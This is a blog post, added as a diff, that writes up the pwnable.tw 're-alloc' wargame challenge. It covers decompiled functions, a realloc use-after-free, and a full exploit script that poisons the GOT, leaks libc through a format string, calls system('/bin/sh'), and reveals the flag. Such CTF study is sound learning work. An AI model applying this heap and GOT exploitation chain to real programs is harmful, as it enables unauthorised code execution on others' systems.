@@ -1,0 +1,273 @@
+---
+title: '[PWNABLE.TW] - re-alloc'
+description: 'Re-alloc the world!'
+image: '../../../img/cover_photo_wargame_imresizer.png'
+date: 2025-05-15
+tags: ['2025', 'Wargame', 'pwnable.tw']
+authors: ['kdot']
+draft: false
+---
+
+
+import Challenge from '@/components/mdx/Challenge.astro'
+
+## Challenge Information
+<Challenge
+  category="pwn"
+  points={100}
+  description="I want to realloc my life :)"
+  flag="FLAG{r3all0c_the_memory_r3all0c_the_sh3ll}"
+>
+</Challenge>
+
+## Reverse Engineering
+
+```sh title="GDB"
+alter ^ Sol in /mnt/e/sec/lab/pwnable.tw/re-alloc
+$ checksec re-alloc
+[*] '/mnt/e/sec/lab/pwnable.tw/re-alloc/re-alloc'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    FORTIFY:    Enabled
+    Stripped:   No
+```
+
+So as we can see, the binary is not stripped and has a canary. The binary is not PIE, so we can use absolute addresses. Let's dive into the code and analyze it.
+
+<details id="">
+<summary>allocate</summary>
+<p>
+
+```c
+int allocate()
+{
+  _BYTE *v0; // rax
+  unsigned __int64 index; // [rsp+0h] [rbp-20h]
+  unsigned __int64 size; // [rsp+8h] [rbp-18h]
+  void **v4; // [rsp+18h] [rbp-8h]
+
+  printf("Index:");
+  index = read_long();
+  if ( index > 1 || (&heap)[index] )
+  {
+    LODWORD(v0) = puts("Invalid !");
+  }
+  else
+  {
+    printf("Size:");
+    size = read_long();
+    if ( size <= 0x78 )
+    {
+      v4 = (void **)realloc(0LL, size);
+      if ( v4 )
+      {
+        (&heap)[index] = v4;
+        printf("Data:");
+        v0 = (char *)(&heap)[index] + read_input((__int64)(&heap)[index], (unsigned int)size);
+        *v0 = 0;
+      }
+      else
+      {
+        LODWORD(v0) = puts("alloc error");
+      }
+    }
+    else
+    {
+      LODWORD(v0) = puts("Too large!");
+    }
+  }
+  return (int)v0;
+}
+```
+
+</p>
+</details>
+
+<details id="">
+<summary>reallocate</summary>
+<p>
+
+```c
+int reallocate()
+{
+  unsigned __int64 v1; // [rsp+8h] [rbp-18h]
+  unsigned __int64 size; // [rsp+10h] [rbp-10h]
+  void **v3; // [rsp+18h] [rbp-8h]
+
+  printf("Index:");
+  v1 = read_long();
+  if ( v1 > 1 || !(&heap)[v1] )
+    return puts("Invalid !");
+  printf("Size:");
+  size = read_long();
+  if ( size > 0x78 )
+    return puts("Too large!");
+  v3 = (void **)realloc((&heap)[v1], size);
+  if ( !v3 )
+    return puts("alloc error");
+  (&heap)[v1] = v3;
+  printf("Data:");
+  return read_input((&heap)[v1], (unsigned int)size);
+}
+```
+
+</p>
+</details>
+
+<details id="">
+<summary>reallocate</summary>
+<p>
+```c
+int rfree()
+{
+  void ***p_heap; // rax
+  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
+
+  printf("Index:");
+  v2 = read_long();
+  if ( v2 > 1 )
+  {
+    LODWORD(p_heap) = puts("Invalid !");
+  }
+  else
+  {
+    realloc((&heap)[v2], 0LL);
+    p_heap = &heap;
+    (&heap)[v2] = 0LL;
+  }
+  return (int)p_heap;
+}
+```
+</p>
+</details>
+
+There're 3 main functions in the binary: `allocate`, `reallocate`, and `rfree`. The first function allocates memory, the second one reallocates it, and the last one frees it. So, we can see all three functions are using a function called `realloc`, which is a standard C library function that changes the size of the memory block pointed to by a pointer. The `realloc` function takes two arguments: a pointer to the memory block to be resized and the new size in bytes. If the new size is larger than the old size, `realloc` may allocate a new memory block and copy the contents of the old block to the new one. If the new size is smaller, `realloc` may simply reduce the size of the existing block. But there're some special case here:
+- When `size` is NULL (or zero), `realloc` will free that chunk
+- When `ptr` is NULL, `realloc` will behave like `malloc`
+
+In the case it frees the chunk, it will call `free` on the pointer passed to it. But the problem is it not clear the pointer that lead to `Use-After-Free` here.
+
+## Exploit Strategies
+
+So the binary have `Use-After-Free` bug in `reallocate` function by passing to `realloc` a size equal to zero. This will free the chunk, but the pointer is still pointing to the freed memory.
+And becasue there is `Partial RELRO` we can overwrite the GOT entry. So my plan here is:
+
+- Overwrite `atoll` GOT entry with `printf` address
+- Do `Format String` attack to leak the libc base address
+- Overwrite `atoll` GOT entry with `system` address
+- Call `system("/bin/sh")` to get a shell
+
+## Exploit
+
+```py title="exploit.py"
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwnie import *
+from subprocess import check_output
+from time import sleep
+
+context.log_level = 'debug'
+context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
+exe = context.binary = ELF('./re-alloc_patched', checksec=False)
+libc = exe.libc
+
+gdbscript = '''
+init-pwndbg
+b *0x4013F1
+b *0x40155C
+b *0x401632
+b *0x40129D
+c
+'''
+
+def start(argv=[]):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2])
+    elif args.DOCKER:
+        p = remote("localhost", 5000)
+        sleep(0.5)
+        pid = int(check_output(["pidof", "-s", "/app/run"]))
+        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
+        pause()
+        return p
+    else:
+        return process([exe.path] + argv, aslr=False)
+
+def alloc(idx, size, data):
+    slna(b': ', 1)
+    slna(b':', idx)
+    slna(b':', size)
+    sa(b':', data)
+
+def realloc(idx, size, data):
+    slna(b': ', 2)
+    slna(b':',idx)
+    slna(b':', size)
+    sa(b':', data)
+
+def realloc_free(idx):
+    slna(b': ', 2)
+    slna(b':',idx)
+    slna(b':', b'0')
+
+def rfree(idx):
+    slna(b': ', 3)
+    slna(b':', idx)
+
+# ==================== EXPLOIT ====================
+
+# realloc(ptr, 0) --> free(ptr)
+# realloc(0, size) --> malloc(size)
+# realloc(ptr, size) --> expand/shrink, do nothing if same size
+
+# allocate() - use to allocate memory via realloc
+# reallocate() - use to reallocate memory via realloc - lead to UAF if input size is 0
+# rfree() - use to free memory via realloc - can be used to reset the index pointer
+
+p = start()
+
+alloc(0, 0x18, b'0')
+realloc_free(0)
+realloc(0, 0x18, p64(exe.got.atoll))
+alloc(1, 0x18, b'1')
+
+# Reset index 1
+realloc(1, 0x28, b'1')
+rfree(1)
+
+realloc(0, 0x28, p64(exe.got.atoll))
+alloc(1, 0x28, b'1')
+
+# Reset index 0, 1
+realloc(0, 64, b'0')
+rfree(0)
+realloc(1, 120, b'1')
+rfree(1)
+
+alloc(0, 0x20, p64(exe.plt.printf))
+
+slna(b': ', 1)
+sla(b':', b'%6$p')
+
+libc.address = hexleak(rl()[:-1]) - 0x1e5760
+success('libc base @ %#x', libc.address)
+
+if args.GDB:
+    gdb.attach(p, gdbscript=gdbscript)
+    pause()
+
+# printf return total bytes it print
+sla(b'choice: ', b'1')
+sa(b'Index:', b'A')
+sa(b':',  b'A'*0x8 + b'\0')
+sa(b':',  p64(libc.sym.system))
+
+sla(b'choice: ', b'1')
+s(b'/bin/sh\0')
+
+interactive()
+# FLAG{r3all0c_the_memory_r3all0c_the_sh3ll}
+```
